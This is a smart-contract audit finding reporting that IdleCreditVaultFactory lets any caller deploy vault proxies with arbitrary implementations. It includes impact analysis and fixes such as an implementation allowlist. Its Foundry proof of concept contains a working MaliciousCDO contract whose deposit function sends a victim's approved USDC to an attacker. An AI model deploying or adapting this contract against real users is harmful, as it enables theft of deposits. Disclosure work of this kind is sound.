### Title
Permissionless factory accepts arbitrary implementations, enabling malicious credit-vault proxies to steal deposits - (File: contracts/IdleCreditVaultFactory.sol)

### Summary

`IdleCreditVaultFactory` allows any EOA to deploy a credit vault using caller-supplied implementation contracts. Neither `deployCreditVault` nor `deployRevolvingCreditVault` has caller authentication or an implementation whitelist; the supplied addresses are passed directly to `TransparentUpgradeableProxy` [1](#0-0) [2](#0-1) . An attacker can therefore deploy a factory-emitted vault whose CDO proxy executes malicious code and steals approved underlying tokens on the first deposit.

### Finding Description

`CreditVaultParams.implementation`, `StrategyData.implementation`, and `ProgrammableBorrowerParams.implementation` are all externally supplied [3](#0-2) [4](#0-3) . `_deployProxy` installs those addresses without checking bytecode, a registry entry, an approved implementation hash, or the deployer’s identity [2](#0-1) .

For `deployCreditVault`, the malicious implementation only needs to expose the initializer and configuration selectors invoked by the factory, then implement `depositAA` or `depositBB` as a theft function. The factory subsequently emits `CreditVaultDeployed`, making the malicious deployment indistinguishable at the event level from a legitimate vault [5](#0-4) . The malicious CDO can also ignore the later `transferOwnership(treasury)` call, so transferring nominal ownership does not neutralize a hard-coded backdoor.

### Impact Explanation

A victim who approves and deposits into the malicious proxy loses the full deposited amount. With a `100,000 USDC` deposit, the attacker receives `100,000 USDC`; the theft is bounded only by the victim’s deposit amount and allowance. This breaks fair minting and vault solvency because the deposited principal is diverted before any tranche shares or strategy backing are created.

### Likelihood Explanation

Deployment requires no privileged role: the only deployment checks are nonzero manager and minimum fee parameters [6](#0-5) [7](#0-6) . Exploitation does require a depositor to interact with the attacker-created vault, so it is not a compromise of previously deployed vaults. However, because the factory itself emits the deployment and applies no implementation provenance check, integrators or users cannot distinguish trusted bytecode from attacker bytecode from the factory event alone.

### Recommendation

Restrict deployment to the treasury or another explicitly authorized role, and maintain an on-chain allowlist of approved CDO, strategy, queue, write-off escrow, and programmable-borrower implementations. At minimum, `_deployProxy` should reject any implementation not registered in that allowlist. If permissionless deployment is intentional, emit a cryptographic implementation identifier and expose an `isOfficialVault(address)` registry so users and interfaces can reject unapproved bytecode.

### Proof of Concept

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {TransparentUpgradeableProxy} from
  "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {IERC20Detailed} from "../contracts/interfaces/IERC20Detailed.sol";
import {IdleCreditVaultFactory} from "../contracts/IdleCreditVaultFactory.sol";
import {IdleCreditVault} from "../contracts/strategies/idle/IdleCreditVault.sol";

contract MaliciousCDO {
  address public token;
  address public immutable thief;

  constructor(address _thief) {
    thief = _thief;
  }

  function initialize(
    uint256,
    address _token,
    address,
    address,
    address,
    address,
    uint256
  ) external {
    token = _token;
  }

  function setEpochParams(uint256, uint256) external {}
  function setInstantWithdrawParams(uint256, uint256, bool) external {}
  function setKeyringParams(address, uint256) external {}
  function setIsInterestMinted(bool) external {}
  function setIsDepositDuringEpochDisabled(bool) external {}
  function setFeeParams(address, uint256, uint256, uint256) external {}
  function setGuardian(address) external {}
  function transferOwnership(address) external {}

  function depositAA(uint256 amount) external returns (uint256) {
    IERC20Detailed(token).transferFrom(msg.sender, thief, amount);
    return amount;
  }
}

contract FactoryArbitraryImplementationPoC is Test {
  bytes32 internal constant DEPLOYED =
    keccak256("CreditVaultDeployed(address,address,address,address,address,address)");

  address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

  function testMaliciousFactoryDeploymentStealsDeposit() external {
    vm.createSelectFork("mainnet");

    address treasury = makeAddr("treasury");
    address proxyAdmin = makeAddr("proxyAdmin");
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");
    address manager = makeAddr("honestManager");
    address borrower = makeAddr("honestBorrower");

    IdleCreditVaultFactory factoryImpl = new IdleCreditVaultFactory();
    IdleCreditVaultFactory factory = IdleCreditVaultFactory(
      address(new TransparentUpgradeableProxy(
        address(factoryImpl),
        proxyAdmin,
        abi.encodeWithSelector(
          IdleCreditVaultFactory.initialize.selector,
          treasury,
          proxyAdmin
        )
      ))
    );

    IdleCreditVault strategyImpl = new IdleCreditVault();
    MaliciousCDO maliciousImpl = new MaliciousCDO(attacker);

    IdleCreditVaultFactory.CreditVaultParams memory cvParams =
      IdleCreditVaultFactory.CreditVaultParams({
        implementation: address(maliciousImpl),
        limit: 0,
        underlying: USDC,
        apr: 5e18,
        epochDuration: 7 days,
        bufferPeriod: 1 days,
        instantWithdrawDelay: 1 hours,
        instantWithdrawAprDelta: 1e18,
        disableInstantWithdraw: true,
        keyringPolicy: 0,
        feeReceiver: makeAddr("creatorFeeReceiver"),
        fees: 5_000,
        managementFee: 500,
        isInterestMinted: false,
        isDepositDuringEpochDisabled: true
      });

    IdleCreditVaultFactory.StrategyData memory strategyData =
      IdleCreditVaultFactory.StrategyData({
        implementation: address(strategyImpl),
        manager: manager,
        borrower: borrower,
        borrowerName: "HonestBorrower"
      });

    IdleCreditVaultFactory.AncillaryParams memory ancillary =
      IdleCreditVaultFactory.AncillaryParams({
        keyring: address(0),
        queueImplementation: address(0),
        prefundedDepositWindow: 0,
        writeOffImplementation: address(0)
      });

    vm.recordLogs();
    vm.prank(attacker);
    factory.deployCreditVault(cvParams, strategyData, ancillary);

    address maliciousVault;
    Vm.Log[] memory logs = vm.getRecordedLogs();
    for (uint256 i; i < logs.length; ++i) {
      if (logs[i].topics[0] == DEPLOYED) {
        (maliciousVault,,,,,) = abi.decode(
          logs[i].data,
          (address, address, address, address, address, address)
        );
      }
    }
    assertTrue(maliciousVault != address(0));

    uint256 amount = 100_000e6;
    deal(USDC, victim, amount);

    vm.startPrank(victim);
    IERC20Detailed(USDC).approve(maliciousVault, amount);
    MaliciousCDO(maliciousVault).depositAA(amount);
    vm.stopPrank();

    assertEq(IERC20Detailed(USDC).balanceOf(attacker), amount);
    assertEq(IERC20Detailed(USDC).balanceOf(victim), 0);
  }
}
```

### Citations

**File:** contracts/IdleCreditVaultFactory.sol (L52-75)
```text
  struct StrategyData {
    address implementation;
    address manager;
    address borrower;
    string borrowerName;
  }

  struct CreditVaultParams {
    address implementation;
    uint256 limit;
    address underlying;
    uint256 apr;
    uint256 epochDuration;
    uint256 bufferPeriod;
    uint256 instantWithdrawDelay;
    uint256 instantWithdrawAprDelta;
    bool disableInstantWithdraw;
    uint256 keyringPolicy;
    address feeReceiver;
    uint256 fees;
    uint256 managementFee;
    bool isInterestMinted;
    bool isDepositDuringEpochDisabled;
  }
```

**File:** contracts/IdleCreditVaultFactory.sol (L85-90)
```text
  struct ProgrammableBorrowerParams {
    address implementation;
    address vault;
    address borrower;
    uint256 borrowerApr;
  }
```

**File:** contracts/IdleCreditVaultFactory.sol (L92-105)
```text
  function deployCreditVault(
    CreditVaultParams memory cvParams,
    StrategyData memory strategyData,
    AncillaryParams memory ancillaryParams
  ) external {
    _checkMinimumFees(cvParams);
    address manager = strategyData.manager;
    if (manager == address(0)) revert Is0();

    (IdleCDOEpochVariant cv, IdleCreditVault strategy) =
      _deployBaseCreditVault(strategyData, cvParams);

    address keyringWhitelist = _deployKeyring(ancillaryParams);
    _configureCreditVault(cv, strategy, cvParams, keyringWhitelist, manager);
```

**File:** contracts/IdleCreditVaultFactory.sol (L112-123)
```text
    // Transfer ownership of strategy and credit vault to treasury
    strategy.transferOwnership(treasury);
    cv.transferOwnership(treasury);

    emit CreditVaultDeployed(
      address(cv),
      address(strategy),
      address(queue),
      address(0),
      keyringWhitelist,
      address(writeOffEscrow)
    );
```

**File:** contracts/IdleCreditVaultFactory.sol (L280-285)
```text
  function _deployProxy(address implementation, bytes memory data) internal returns (address) {
    return address(new TransparentUpgradeableProxy(
      implementation,
      proxyAdmin,
      data
    ));
```

**File:** contracts/IdleCreditVaultFactory.sol (L309-311)
```text
  function _checkMinimumFees(CreditVaultParams memory cvParams) internal pure {
    if (cvParams.fees < MIN_PERFORMANCE_FEE && cvParams.managementFee < MIN_MANAGEMENT_FEE) revert FeesTooLow();
  }
```
